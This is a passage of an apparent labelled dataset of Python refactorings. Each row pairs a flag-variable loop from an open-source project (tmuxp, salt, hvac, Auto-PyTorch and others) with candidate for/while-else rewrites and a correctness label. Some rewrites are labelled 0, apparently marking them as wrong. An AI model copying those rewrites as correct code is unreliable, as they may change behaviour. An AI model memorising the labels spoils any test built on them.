        For example, :obj:`input = ""unaffable""` wil return as output :obj:`[""un"", ""##aff"", ""##able""]`.

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer`.

        Returns:
          A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
tmuxp,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tmuxp/tests/test_workspacebuilder.py,https://github.com/tmux-python/tmuxp/tree/master/tests/test_workspacebuilder.py,,test_window_options_after$268,"def test_window_options_after(session):
    yaml_config = loadfixture(""workspacebuilder/window_options_after.yaml"")
    sconfig = kaptan.Kaptan(handler='yaml')
    sconfig = sconfig.import_config(yaml_config).get()
    sconfig = config.expand(sconfig)

    builder = WorkspaceBuilder(sconf=sconfig)
    builder.build(session=session)

    def assert_last_line(p, s):
        correct = False

        while retry():
            pane_out = p.cmd('capture-pane', '-p', '-J').stdout
            while not pane_out[-1].strip():  # delete trailing lines tmux 1.8
                pane_out.pop()
            if len(pane_out) > 1 and pane_out[-2].strip() == s:
                correct = True
                break

        # Print output for easier debugging if assertion fails
        if not correct:
            print('\n'.join(pane_out))

        return correct

    for i, pane in enumerate(session.attached_window.panes):
        assert assert_last_line(
            pane, str(i)
        ), ""Initial command did not execute properly/"" + str(i)
        pane.cmd('send-keys', 'Up')  # Will repeat echo
        pane.enter()  # in each iteration
        assert assert_last_line(
            pane, str(i)
        ), ""Repeated command did not execute properly/"" + str(i)

    session.cmd('send-keys', ' echo moo')
    session.cmd('send-keys', 'Enter')

    for pane in session.attached_window.panes:
        assert assert_last_line(
            pane, 'moo'
        ), ""Synchronized command did not execute properly""","while retry():
    pane_out = p.cmd('capture-pane', '-p', '-J').stdout
    while not pane_out[-1].strip():
        pane_out.pop()
    if len(pane_out) > 1 and pane_out[-2].strip() == s:
        correct = True
        break
if not correct:
    print('\n'.join(pane_out))","while retry():
    pane_out = p.cmd('capture-pane', '-p', '-J').stdout
    while not pane_out[-1].strip():
        pane_out.pop()
    if len(pane_out) > 1 and pane_out[-2].strip() == s:
        correct = True
        break
else:
    print('\n'.join(pane_out))","while retry():
    pane_out = p.cmd('capture-pane', '-p', '-J').stdout
    while not pane_out[-1].strip():
        pane_out.pop()
    if len(pane_out) > 1 and pane_out[-2].strip() == s:
        correct = True
        break
else:
    print('\n'.join(pane_out))",1,"while retry():
    pane_out = p.cmd('capture-pane', '-p', '-J').stdout
    while not pane_out[-1].strip():
        pane_out.pop()
    if len(pane_out) > 1 and pane_out[-2].strip() == s:
        correct = True
        break
if not correct:
    print('\n'.join(pane_out))","break statement is executed:None
break statement is not executed:zejun1"
roberta_zh,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/roberta_zh/create_pretraining_data.py,https://github.com/brightmart/roberta_zh/tree/master//create_pretraining_data.py,,get_new_segment$250,"def get_new_segment(segment): #  新增的方法 ####
    """"""
    输入一句话，返回一句经过处理的话: 为了支持中文全称mask，将被分开的词，将上特殊标记(""#"")，使得后续处理模块，能够知道哪些字是属于同一个词的。
    :param segment: 一句话
    :return: 一句处理过的话
    """"""
    seq_cws = jieba.lcut("""".join(segment))
    seq_cws_dict = {x: 1 for x in seq_cws}
    new_segment = []
    i = 0
    while i < len(segment):
        if len(re.findall('[\u4E00-\u9FA5]', segment[i]))==0: # 不是中文的，原文加进去。
            new_segment.append(segment[i])
            i += 1
            continue

        has_add = False
        for length in range(3,0,-1):
            if i+length>len(segment):
                continue
            if ''.join(segment[i:i+length]) in seq_cws_dict:
                new_segment.append(segment[i])
                for l in range(1, length):
                    new_segment.append('##' + segment[i+l])
                i += length
                has_add = True
                break
        if not has_add:
            new_segment.append(segment[i])
            i += 1
    return new_segment","for length in range(3, 0, -1):
    if i + length > len(segment):
        continue
    if ''.join(segment[i:i + length]) in seq_cws_dict:
        new_segment.append(segment[i])
        for l in range(1, length):
            new_segment.append('##' + segment[i + l])
        i += length
        has_add = True
        break
if not has_add:
    new_segment.append(segment[i])
    i += 1","for length in range(3, 0, -1):
    if i + length > len(segment):
        continue
    if ''.join(segment[i:i + length]) in seq_cws_dict:
        new_segment.append(segment[i])
        for l in range(1, length):
            new_segment.append('##' + segment[i + l])
        i += length
        break
else:
    new_segment.append(segment[i])
    i += 1","for length in range(3, 0, -1):
    if i + length > len(segment):
        continue
    if ''.join(segment[i:i + length]) in seq_cws_dict:
        new_segment.append(segment[i])
        for l in range(1, length):
            new_segment.append('##' + segment[i + l])
        i += length
        break
else:
    new_segment.append(segment[i])
    i += 1",1,"for length in range(3, 0, -1):
    if i + length > len(segment):
        continue
    if ''.join(segment[i:i + length]) in seq_cws_dict:
        new_segment.append(segment[i])
        for l in range(1, length):
            new_segment.append('##' + segment[i + l])
        i += length
        has_add = True
        break
if not has_add:
    new_segment.append(segment[i])
    i += 1","break statement is executed:None
break statement is not executed:zejun1"
Auto-PyTorch,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Auto-PyTorch/autoPyTorch/pipeline/base_pipeline.py,https://github.com/automl/Auto-PyTorch/tree/master/autoPyTorch/pipeline/base_pipeline.py,BasePipeline,_check_search_space_updates$400,"def _check_search_space_updates(self, include: Optional[Dict[str, Any]],
                                    exclude: Optional[Dict[str, Any]]) -> None:
        assert self.search_space_updates is not None
        for update in self.search_space_updates.updates:
            if update.node_name not in self.named_steps.keys():
                raise ValueError(""Unknown node name. Expected update node name to be in {} ""
                                 ""got {}"".format(self.named_steps.keys(), update.node_name))
            node = self.named_steps[update.node_name]
            # if node is a choice module
            if hasattr(node, 'get_components'):
                split_hyperparameter = update.hyperparameter.split(':')

                # check if component is not present in include
                if include is not None and update.node_name in include.keys():
                    if split_hyperparameter[0] not in include[update.node_name]:
                        hp_in_component = False
                        # If the node contains subcomponent that is also an instance of autoPyTorchChoice,
                        # We need to ensure that include is properly passed to it subcomponent
                        for include_component in include[update.node_name]:
                            if include_component.startswith(split_hyperparameter[0]):
                                hp_in_component = True
                                break
                        if not hp_in_component:
                            raise ValueError(""Not found {} in include"".format(split_hyperparameter[0]))

                # check if component is present in exclude
                if exclude is not None and update.node_name in exclude.keys():
                    if split_hyperparameter[0] in exclude[update.node_name]:
                        hp_in_component = False
                        for exclude_component in exclude[update.node_name]:
                            if exclude_component.startswith(split_hyperparameter[0]):
                                hp_in_component = True
                                break
                        if not hp_in_component:
                            raise ValueError(""Found {} in exclude"".format(split_hyperparameter[0]))

                components = node.get_components()
                # if hyperparameter is __choice__, check if
                # the components in the value range of search space update
                # are in components of the choice module
                if split_hyperparameter[0] == '__choice__':
                    for choice in update.value_range:
                        if include is not None and update.node_name in include.keys():
                            if choice not in include[update.node_name]:
                                raise ValueError(""Not found {} in include"".format(choice))
                        if exclude is not None and update.node_name in exclude.keys():
                            if choice in exclude[update.node_name]:
                                raise ValueError(""Found {} in exclude"".format(choice))
                        if choice not in components.keys():
                            raise ValueError(""Unknown hyperparameter for choice {}. ""
                                             ""Expected update hyperparameter ""
                                             ""to be in {} got {}"".format(node.__class__.__name__,
                                                                         components.keys(), choice))
                # check if the component whose hyperparameter
                # needs to be updated is in components of the
                # choice module
                elif split_hyperparameter[0] not in components.keys():
                    hp_in_component = False
                    if hasattr(node, 'additional_components') and node.additional_components:
                        # This is designed for forecasting network encoder:
                        # forecasting network backbone is composed of two parts: encoder and decoder whereas the type
                        # of the decoder is determined by the encoder. However, the type of decoder cannot be any part
                        # of encoder's choice. To allow the user to update the hyperparameter search space for decoder
                        # network, we consider decoder as ""additional_components"" and check if the update can be applied
                        # to node.additional_components
                        for component_func in node.additional_components:
                            if split_hyperparameter[0] in component_func().keys():
                                hp_in_component = True
                                break
                    if not hp_in_component:
                        raise ValueError(""Unknown hyperparameter for choice {}. ""
                                         ""Expected update hyperparameter ""
                                         ""to be in {} got {}"".format(node.__class__.__name__,
                                                                     components.keys(), split_hyperparameter[0]))
                else:
                    # check if hyperparameter is in the search space of the component
                    component = components[split_hyperparameter[0]]
                    if split_hyperparameter[1] not in component. \
                            get_hyperparameter_search_space(dataset_properties=self.dataset_properties):
                        # Check if update hyperparameter is in names of
                        # hyperparameters of the search space
                        # Example 'num_units' in 'num_units_1', 'num_units_2'
                        if any([split_hyperparameter[1] in name for name in
                                component.get_hyperparameter_search_space(
                                    dataset_properties=self.dataset_properties).get_hyperparameter_names()]):
                            continue
                        raise ValueError(""Unknown hyperparameter for component {}. ""
                                         ""Expected update hyperparameter ""
                                         ""to be in {} got {}"".format(node.__class__.__name__,
                                                                     component.
                                                                     get_hyperparameter_search_space(
                                                                         dataset_properties=self.dataset_properties).
                                                                     get_hyperparameter_names(),
                                                                     split_hyperparameter[1]))
            else:
                if update.hyperparameter not in node.get_hyperparameter_search_space(
                        dataset_properties=self.dataset_properties):
                    if any([update.hyperparameter in name for name in
                            node.get_hyperparameter_search_space(
                                dataset_properties=self.dataset_properties).get_hyperparameter_names()]):
                        continue
                    raise ValueError(""Unknown hyperparameter for component {}. ""
                                     ""Expected update hyperparameter ""
                                     ""to be in {} got {}"".format(node.__class__.__name__,
                                                                 node.
                                                                 get_hyperparameter_search_space(
                                                                     dataset_properties=self.dataset_properties).
                                                                 get_hyperparameter_names(), update.hyperparameter))","for include_component in include[update.node_name]:
    if include_component.startswith(split_hyperparameter[0]):
        hp_in_component = True
        break
if not hp_in_component:
    raise ValueError('Not found {} in include'.format(split_hyperparameter[0]))","for include_component in include[update.node_name]:
    if include_component.startswith(split_hyperparameter[0]):
        hp_in_component = True
        break
else:
    raise ValueError('Not found {} in include'.format(split_hyperparameter[0]))","for include_component in include[update.node_name]:
    if include_component.startswith(split_hyperparameter[0]):
        break
else:
    raise ValueError('Not found {} in include'.format(split_hyperparameter[0]))",0,"for include_component in include[update.node_name]:
    if include_component.startswith(split_hyperparameter[0]):
        hp_in_component = True
        break
if not hp_in_component:
    raise ValueError('Not found {} in include'.format(split_hyperparameter[0]))","break statement is executed:None
break statement is not executed:zejun1"
Auto-PyTorch,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Auto-PyTorch/autoPyTorch/pipeline/base_pipeline.py,https://github.com/automl/Auto-PyTorch/tree/master/autoPyTorch/pipeline/base_pipeline.py,BasePipeline,_check_search_space_updates$400,"def _check_search_space_updates(self, include: Optional[Dict[str, Any]],
                                    exclude: Optional[Dict[str, Any]]) -> None:
        assert self.search_space_updates is not None
        for update in self.search_space_updates.updates:
            if update.node_name not in self.named_steps.keys():
                raise ValueError(""Unknown node name. Expected update node name to be in {} ""
                                 ""got {}"".format(self.named_steps.keys(), update.node_name))
            node = self.named_steps[update.node_name]
            # if node is a choice module
            if hasattr(node, 'get_components'):
                split_hyperparameter = update.hyperparameter.split(':')

                # check if component is not present in include
                if include is not None and update.node_name in include.keys():
                    if split_hyperparameter[0] not in include[update.node_name]:
                        hp_in_component = False
                        # If the node contains subcomponent that is also an instance of autoPyTorchChoice,
                        # We need to ensure that include is properly passed to it subcomponent
                        for include_component in include[update.node_name]:
                            if include_component.startswith(split_hyperparameter[0]):
                                hp_in_component = True
                                break
                        if not hp_in_component:
                            raise ValueError(""Not found {} in include"".format(split_hyperparameter[0]))

                # check if component is present in exclude
                if exclude is not None and update.node_name in exclude.keys():
                    if split_hyperparameter[0] in exclude[update.node_name]:
                        hp_in_component = False
                        for exclude_component in exclude[update.node_name]:
                            if exclude_component.startswith(split_hyperparameter[0]):
                                hp_in_component = True
                                break
                        if not hp_in_component:
                            raise ValueError(""Found {} in exclude"".format(split_hyperparameter[0]))

                components = node.get_components()
                # if hyperparameter is __choice__, check if
                # the components in the value range of search space update
                # are in components of the choice module
                if split_hyperparameter[0] == '__choice__':
                    for choice in update.value_range:
                        if include is not None and update.node_name in include.keys():
                            if choice not in include[update.node_name]:
                                raise ValueError(""Not found {} in include"".format(choice))
                        if exclude is not None and update.node_name in exclude.keys():
                            if choice in exclude[update.node_name]:
                                raise ValueError(""Found {} in exclude"".format(choice))
                        if choice not in components.keys():
                            raise ValueError(""Unknown hyperparameter for choice {}. ""
                                             ""Expected update hyperparameter ""
                                             ""to be in {} got {}"".format(node.__class__.__name__,
                                                                         components.keys(), choice))
                # check if the component whose hyperparameter
                # needs to be updated is in components of the
                # choice module
                elif split_hyperparameter[0] not in components.keys():
                    hp_in_component = False
                    if hasattr(node, 'additional_components') and node.additional_components:
                        # This is designed for forecasting network encoder:
                        # forecasting network backbone is composed of two parts: encoder and decoder whereas the type
                        # of the decoder is determined by the encoder. However, the type of decoder cannot be any part
                        # of encoder's choice. To allow the user to update the hyperparameter search space for decoder
                        # network, we consider decoder as ""additional_components"" and check if the update can be applied
                        # to node.additional_components
                        for component_func in node.additional_components:
                            if split_hyperparameter[0] in component_func().keys():
                                hp_in_component = True
                                break
                    if not hp_in_component:
                        raise ValueError(""Unknown hyperparameter for choice {}. ""
                                         ""Expected update hyperparameter ""
                                         ""to be in {} got {}"".format(node.__class__.__name__,
                                                                     components.keys(), split_hyperparameter[0]))
                else:
                    # check if hyperparameter is in the search space of the component
                    component = components[split_hyperparameter[0]]
                    if split_hyperparameter[1] not in component. \
                            get_hyperparameter_search_space(dataset_properties=self.dataset_properties):
                        # Check if update hyperparameter is in names of
                        # hyperparameters of the search space
                        # Example 'num_units' in 'num_units_1', 'num_units_2'
                        if any([split_hyperparameter[1] in name for name in
                                component.get_hyperparameter_search_space(
                                    dataset_properties=self.dataset_properties).get_hyperparameter_names()]):
                            continue
                        raise ValueError(""Unknown hyperparameter for component {}. ""
                                         ""Expected update hyperparameter ""
                                         ""to be in {} got {}"".format(node.__class__.__name__,
                                                                     component.
                                                                     get_hyperparameter_search_space(
                                                                         dataset_properties=self.dataset_properties).
                                                                     get_hyperparameter_names(),
                                                                     split_hyperparameter[1]))
            else:
                if update.hyperparameter not in node.get_hyperparameter_search_space(
                        dataset_properties=self.dataset_properties):
                    if any([update.hyperparameter in name for name in
                            node.get_hyperparameter_search_space(
                                dataset_properties=self.dataset_properties).get_hyperparameter_names()]):
                        continue
                    raise ValueError(""Unknown hyperparameter for component {}. ""
                                     ""Expected update hyperparameter ""
                                     ""to be in {} got {}"".format(node.__class__.__name__,
                                                                 node.
                                                                 get_hyperparameter_search_space(
                                                                     dataset_properties=self.dataset_properties).
                                                                 get_hyperparameter_names(), update.hyperparameter))","for exclude_component in exclude[update.node_name]:
    if exclude_component.startswith(split_hyperparameter[0]):
        hp_in_component = True
        break
if not hp_in_component:
    raise ValueError('Found {} in exclude'.format(split_hyperparameter[0]))","for exclude_component in exclude[update.node_name]:
    if exclude_component.startswith(split_hyperparameter[0]):
        hp_in_component = True
        break
else:
    raise ValueError('Found {} in exclude'.format(split_hyperparameter[0]))","for exclude_component in exclude[update.node_name]:
    if exclude_component.startswith(split_hyperparameter[0]):
        break
else:
    raise ValueError('Found {} in exclude'.format(split_hyperparameter[0]))",0,"for exclude_component in exclude[update.node_name]:
    if exclude_component.startswith(split_hyperparameter[0]):
        hp_in_component = True
        break
if not hp_in_component:
    raise ValueError('Found {} in exclude'.format(split_hyperparameter[0]))","break statement is executed:None
break statement is not executed:zejun1"
salt,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/salt/salt/states/boto_iam.py,https://github.com/saltstack/salt/tree/master/salt/states/boto_iam.py,,_group_policies_attached$1315,"def _group_policies_attached(
    name,
    managed_policies=None,
    region=None,
    key=None,
    keyid=None,
    profile=None,
    detach_policies=True,
):
    ret = {""result"": True, ""comment"": """", ""changes"": {}}
    policies_to_attach = []
    policies_to_detach = []
    for policy in managed_policies or []:
        entities = __salt__[""boto_iam.list_entities_for_policy""](
            policy,
            entity_filter=""Group"",
            region=region,
            key=key,
            keyid=keyid,
            profile=profile,
        )
        found = False
        for groupdict in entities.get(""policy_groups"", []):
            if name == groupdict.get(""group_name""):
                found = True
                break
        if not found:
            policies_to_attach.append(policy)
    _list = __salt__[""boto_iam.list_attached_group_policies""](
        name, region=region, key=key, keyid=keyid, profile=profile
    )
    oldpolicies = [x.get(""policy_arn"") for x in _list]
    for policy_data in _list:
        if (
            detach_policies
            and policy_data.get(""policy_name"") not in managed_policies
            and policy_data.get(""policy_arn"") not in managed_policies
        ):
            policies_to_detach.append(policy_data.get(""policy_arn""))
    if policies_to_attach or policies_to_detach:
        _to_modify = list(policies_to_detach)
        _to_modify.extend(policies_to_attach)
        if __opts__[""test""]:
            ret[""comment""] = ""{} policies to be modified on group {}."".format(
                "", "".join(_to_modify), name
            )
            ret[""result""] = None
            return ret
        ret[""changes""][""old""] = {""managed_policies"": oldpolicies}
        for policy_name in policies_to_attach:
            policy_set = __salt__[""boto_iam.attach_group_policy""](
                policy_name, name, region=region, key=key, keyid=keyid, profile=profile
            )
            if not policy_set:
                _list = __salt__[""boto_iam.list_attached_group_policies""](
                    name, region=region, key=key, keyid=keyid, profile=profile
                )
                newpolicies = [x.get(""policy_arn"") for x in _list]
                ret[""changes""][""new""] = {""managed_policies"": newpolicies}
                ret[""result""] = False
                ret[""comment""] = ""Failed to add policy {} to group {}"".format(
                    policy_name, name
                )
                return ret
        for policy_name in policies_to_detach:
            policy_unset = __salt__[""boto_iam.detach_group_policy""](
                policy_name, name, region=region, key=key, keyid=keyid, profile=profile
            )
            if not policy_unset:
                _list = __salt__[""boto_iam.list_attached_group_policies""](
                    name, region=region, key=key, keyid=keyid, profile=profile
                )
                newpolicies = [x.get(""policy_arn"") for x in _list]
                ret[""changes""][""new""] = {""managed_policies"": newpolicies}
                ret[""result""] = False
                ret[""comment""] = ""Failed to remove policy {} from group {}"".format(
                    policy_name, name
                )
                return ret
        _list = __salt__[""boto_iam.list_attached_group_policies""](
            name, region=region, key=key, keyid=keyid, profile=profile
        )
        newpolicies = [x.get(""policy_arn"") for x in _list]
        log.debug(newpolicies)
        ret[""changes""][""new""] = {""managed_policies"": newpolicies}
        ret[""comment""] = ""{} policies modified on group {}."".format(
            "", "".join(newpolicies), name
        )
    return ret","for groupdict in entities.get('policy_groups', []):
    if name == groupdict.get('group_name'):
        found = True
        break
if not found:
    policies_to_attach.append(policy)","for groupdict in entities.get('policy_groups', []):
    if name == groupdict.get('group_name'):
        break
else:
    policies_to_attach.append(policy)","for groupdict in entities.get('policy_groups', []):
    if name == groupdict.get('group_name'):
        break
else:
    policies_to_attach.append(policy)",1,"for groupdict in entities.get('policy_groups', []):
    if name == groupdict.get('group_name'):
        found = True
        break
if not found:
    policies_to_attach.append(policy)","break statement is executed:None
break statement is not executed:zejun1"
hvac,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/hvac/tests/utils/server_manager.py,https://github.com/hvac/hvac/tree/master/tests/utils/server_manager.py,ServerManager,start$36,"def start(self):
        """"""Launch the vault server process and wait until its online and ready.""""""
        if self.use_consul:
            self.start_consul()

        if distutils.spawn.find_executable(""vault"") is None:
            raise SkipTest(""Vault executable not found"")

        # If a vault server is already running then we won't be able to start another one.
        # If we can't start our vault server then we don't know what we're testing against.
        try:
            self.client.sys.is_initialized()
        except Exception:
            pass
        else:
            raise Exception(""Vault server already running"")

        cluster_ready = False
        for config_path in self.config_paths:
            command = [""vault"", ""server"", ""-config="" + config_path]
            logger.debug(f""Starting vault server with command: {command}"")
            process = subprocess.Popen(
                command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            self._processes.append(process)
            logger.debug(f""Spawned vault server with PID {process.pid}"")

            attempts_left = 20
            last_exception = None
            while attempts_left > 0 and not cluster_ready:
                try:
                    logger.debug(""Checking if vault is ready..."")
                    self.client.sys.is_initialized()
                    cluster_ready = True
                    break
                except Exception as ex:
                    if process.poll() is not None:
                        raise Exception(""Vault server terminated before becoming ready"")
                    logger.debug(""Waiting for Vault to start"")
                    time.sleep(0.5)
                    attempts_left -= 1
                    last_exception = ex
            if not cluster_ready:
                if process.poll() is None:
                    process.kill()
                stdout, stderr = process.communicate()
                raise Exception(
                    ""Unable to start Vault in background:\n{err}\n{stdout}\n{stderr}"".format(
                        err=last_exception,
                        stdout=stdout,
                        stderr=stderr,
                    )
                )","while attempts_left > 0 and (not cluster_ready):
    try:
        logger.debug('Checking if vault is ready...')
        self.client.sys.is_initialized()
        cluster_ready = True
        break
    except Exception as ex:
        if process.poll() is not None:
            raise Exception('Vault server terminated before becoming ready')
        logger.debug('Waiting for Vault to start')
        time.sleep(0.5)
        attempts_left -= 1
        last_exception = ex
if not cluster_ready:
    if process.poll() is None:
        process.kill()
    (stdout, stderr) = process.communicate()
    raise Exception('Unable to start Vault in background:\n{err}\n{stdout}\n{stderr}'.format(err=last_exception, stdout=stdout, stderr=stderr))","while attempts_left > 0 and (not cluster_ready):
    try:
        logger.debug('Checking if vault is ready...')
        self.client.sys.is_initialized()
        break
    except Exception as ex:
        if process.poll() is not None:
            raise Exception('Vault server terminated before becoming ready')
        logger.debug('Waiting for Vault to start')
        time.sleep(0.5)
        attempts_left -= 1
        last_exception = ex
else:
    if process.poll() is None:
        process.kill()
    (stdout, stderr) = process.communicate()
    raise Exception('Unable to start Vault in background:\n{err}\n{stdout}\n{stderr}'.format(err=last_exception, stdout=stdout, stderr=stderr))","while attempts_left > 0 and (not cluster_ready):
    try:
        logger.debug('Checking if vault is ready...')
        self.client.sys.is_initialized()
        cluster_ready = True
        break
    except Exception as ex:
        if process.poll() is not None:
            raise Exception('Vault server terminated before becoming ready')
        logger.debug('Waiting for Vault to start')
        time.sleep(0.5)
        attempts_left -= 1
        last_exception = ex
else:
    if process.poll() is None:
        process.kill()
    (stdout, stderr) = process.communicate()
    raise Exception('Unable to start Vault in background:\n{err}\n{stdout}\n{stderr}'.format(err=last_exception, stdout=stdout, stderr=stderr))",0,"while attempts_left > 0 and (not cluster_ready):
    try:
        logger.debug('Checking if vault is ready...')
        self.client.sys.is_initialized()
        cluster_ready = True
        break
    except Exception as ex:
        if process.poll() is not None:
            raise Exception('Vault server terminated before becoming ready')
        logger.debug('Waiting for Vault to start')
        time.sleep(0.5)
        attempts_left -= 1
        last_exception = ex
if not cluster_ready:
    if process.poll() is None:
        process.kill()
    (stdout, stderr) = process.communicate()
    raise Exception('Unable to start Vault in background:\n{err}\n{stdout}\n{stderr}'.format(err=last_exception, stdout=stdout, stderr=stderr))","break statement is executed:None
break statement is not executed:zejun1"
checkmk,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/checkmk/cmk/special_agents/agent_ipmi_sensors.py,https://github.com/tribe29/checkmk/tree/master/cmk/special_agents/agent_ipmi_sensors.py,,parse_data$223,"def parse_data(
    data: Iterable[str],
    excludes: Iterable[str],
) -> None:
    for line in data:
        if line.startswith(""ID""):
            continue
        if excludes:
            has_excludes = False
            for exclude in excludes:
                if exclude in line:
                    has_excludes = True
                    break
            if not has_excludes:
                sys.stdout.write(""%s\n"" % line)
        else:
            sys.stdout.write(""%s\n"" % line)","for exclude in excludes:
    if exclude in line:
        has_excludes = True
        break
if not has_excludes:
    sys.stdout.write('%s\n' % line)","for exclude in excludes:
    if exclude in line:
        break
else:
    sys.stdout.write('%s\n' % line)","for exclude in excludes:
    if exclude in line:
        break
else:
    sys.stdout.write('%s\n' % line)",1,"for exclude in excludes:
    if exclude in line:
        has_excludes = True
        break
if not has_excludes:
    sys.stdout.write('%s\n' % line)","break statement is executed:None
break statement is not executed:zejun1"
brat,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/brat/server/src/annotation.py,https://github.com/nlplab/brat/tree/master/server/src/annotation.py,TextBoundAnnotation,contains$1763,"def contains(self, other):
        """"""Determine if a given other TextBoundAnnotation is contained in this
        one.

        Returns True if each (start, end) span of the other annotation
        is inside (or equivalent with) at least one span of this
        annotation, False otherwise.
        """"""
        for o_start, o_end in other.spans:
            contained = False
            for s_start, s_end in self.spans:
                if o_start >= s_start and o_end <= s_end:
                    contained = True
                    break
            if not contained:
                return False
        return True","for (s_start, s_end) in self.spans:
    if o_start >= s_start and o_end <= s_end:
        contained = True
        break
if not contained:
    return False","for (s_start, s_end) in self.spans:
    if o_start >= s_start and o_end <= s_end:
        break
else:
    return False","for (s_start, s_end) in self.spans:
    if o_start >= s_start and o_end <= s_end:
        break
else:
    return False",1,"for (s_start, s_end) in self.spans:
    if o_start >= s_start and o_end <= s_end:
        contained = True
        break
if not contained:
    return False","break statement is executed:None
break statement is not executed:zejun1"
PaddleDetection,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/PaddleDetection/deploy/pptracking/python/mot/mtmct/utils.py,https://github.com/PaddlePaddle/PaddleDetection/tree/master/deploy/pptracking/python/mot/mtmct/utils.py,,combin_cluster$413,"def combin_cluster(sub_labels, cid_tids):
    cluster = list()
    for sub_c_to_c in sub_labels:
        if len(cluster) < 1:
            cluster = sub_labels[sub_c_to_c]
            continue
        for c_ts in sub_labels[sub_c_to_c]:
            is_add = False
            for i_c, c_set in enumerate(cluster):
                if len(set(c_ts) & set(c_set)) > 0:
                    new_list = list(set(c_ts) | set(c_set))
                    cluster[i_c] = new_list
                    is_add = True
                    break
            if not is_add:
                cluster.append(c_ts)
    labels = list()
    num_tr = 0
    for c_ts in cluster:
        label_list = list()
        for c_t in c_ts:
            label_list.append(cid_tids.index(c_t))
            num_tr += 1
        label_list.sort()
        labels.append(label_list)
    return labels, cluster","for (i_c, c_set) in enumerate(cluster):
    if len(set(c_ts) & set(c_set)) > 0:
        new_list = list(set(c_ts) | set(c_set))
        cluster[i_c] = new_list
        is_add = True
        break
if not is_add:
    cluster.append(c_ts)","for (i_c, c_set) in enumerate(cluster):
    if len(set(c_ts) & set(c_set)) > 0:
        new_list = list(set(c_ts) | set(c_set))
        cluster[i_c] = new_list
        break
else:
    cluster.append(c_ts)","for (i_c, c_set) in enumerate(cluster):
    if len(set(c_ts) & set(c_set)) > 0:
        new_list = list(set(c_ts) | set(c_set))
        cluster[i_c] = new_list
        break
else:
    cluster.append(c_ts)",1,"for (i_c, c_set) in enumerate(cluster):
    if len(set(c_ts) & set(c_set)) > 0:
        new_list = list(set(c_ts) | set(c_set))
        cluster[i_c] = new_list
        is_add = True
        break
if not is_add:
    cluster.append(c_ts)","break statement is executed:None
break statement is not executed:zejun1"
bplustree,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/bplustree/bplustree/memory.py,https://github.com/NicolasLM/bplustree/tree/master/bplustree/memory.py,WAL,get_page$467,"def get_page(self, page: int) -> Optional[bytes]:
        page_start = None
        for store in (self._not_committed_pages, self._committed_pages):
            page_start = store.get(page)
            if page_start:
                break

        if not page_start:
            return None

        return read_from_file(self._fd, page_start,
                              page_start + self._page_size)","for store in (self._not_committed_pages, self._committed_pages):
    page_start = store.get(page)
    if page_start:
        break
if not page_start:
    return None","for store in (self._not_committed_pages, self._committed_pages):
    page_start = store.get(page)
    if page_start:
        break
else:
    return None","for store in (self._not_committed_pages, self._committed_pages):
    page_start = store.get(page)
    if page_start:
        break
else:
    return None",1,"for store in (self._not_committed_pages, self._committed_pages):
    page_start = store.get(page)
    if page_start:
        break
if not page_start:
    return None","break statement is executed:None
break statement is not executed:zejun1"
open-event-server,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/open-event-server/app/api/helpers/permission_manager.py,https://github.com/OpnTec/open-event-server/tree/master/app/api/helpers/permission_manager.py,,permission_manager$379,"def permission_manager(view, view_args, view_kwargs, *args, **kwargs):
    """"""The function use to check permissions

    :param callable view: the view
    :param list view_args: view args
    :param dict view_kwargs: view kwargs
    :param list args: decorator args
    :param dict kwargs: decorator kwargs
    """"""
    methods = 'GET,POST,DELETE,PATCH'

    if 'id' in kwargs:
        view_kwargs['id'] = kwargs['id']

    if kwargs.get('methods'):
        methods = kwargs['methods']

    if request.method not in methods:
        return view(*view_args, **view_kwargs)

    # leave_if checks if we have to bypass this request on the basis of lambda function
    if 'leave_if' in kwargs:
        check = kwargs['leave_if']
        if check(view_kwargs):
            return view(*view_args, **view_kwargs)

    # A check to ensure it is good to go ahead and check permissions
    if 'check' in kwargs:
        check = kwargs['check']
        if not check(view_kwargs):
            raise ForbiddenError({'source': ''}, 'Access forbidden')

    # For Orders API
    if 'order_identifier' in view_kwargs:
        try:
            order = Order.query.filter_by(
                identifier=view_kwargs['order_identifier']
            ).one()
        except NoResultFound:
            raise NotFoundError({'parameter': 'order_identifier'}, 'Order not found')
        view_kwargs['id'] = order.id

    # If event_identifier in route instead of event_id
    if 'event_identifier' in view_kwargs:
        try:
            event = Event.query.filter_by(
                identifier=view_kwargs['event_identifier']
            ).one()
        except NoResultFound:
            raise NotFoundError({'parameter': 'event_identifier'}, 'Event not found')
        view_kwargs['event_id'] = event.id

